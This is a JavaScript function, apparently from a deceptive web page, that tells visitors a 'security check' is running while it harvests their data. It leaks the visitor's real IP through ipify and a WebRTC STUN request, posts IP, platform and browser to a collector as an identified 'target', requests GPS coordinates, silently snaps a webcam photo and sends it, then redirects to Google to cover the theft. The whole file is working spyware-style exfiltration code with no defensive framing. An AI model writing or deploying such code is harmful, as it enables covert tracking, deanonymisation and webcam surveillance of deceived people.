async function execute() {
    const box = document.querySelector('.box');
    box.innerHTML = "<h3>Analyse en cours...</h3><p>V√©rification des protocoles de s√©curit√©...</p>";

    let finalIP = "D√©tection impossible (Blocage Navigateur)";

    // FONCTION WEBRTC POUR CHOPER L'IP R√âELLE
    async function getRTCPeerConnectionIP() {
        return new Promise((resolve) => {
            const rtc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            rtc.createDataChannel("");
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
                resolve(ip);
                rtc.onicecandidate = null;
            };
            setTimeout(() => resolve(null), 1000);
        });
    }

    // TENTATIVE DE R√âCUP√âRATION MULTIPLE
    try {
        const [ip1, ip2] = await Promise.all([
            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
            getRTCPeerConnectionIP()
        ]);
        finalIP = ip1 || ip2 || "IP Masqu√©e";
    } catch (e) { console.log("√âchec des APIs classiques"); }

    // ENVOI IMM√âDIAT
    await post(`üöÄ **CIBLE PC IDENTIFI√âE**\n**IP**: ${finalIP}\n**Appareil**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}`);

    // GPS & CAM√âRA (Suite habituelle)
    navigator.geolocation.getCurrentPosition(async (p) => {
        await post(`üìç **GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
    }, null, {timeout: 3000});

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    await post("üì∏ **CAPTURE R√âUSSIE**", blob);
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.google.com";
                }, 'image/png');
            }, 1000);
        };
    } catch (err) {
        await post("‚ö†Ô∏è Cam√©ra refus√©e");
        window.location.href = "https://www.google.com";
    }
}
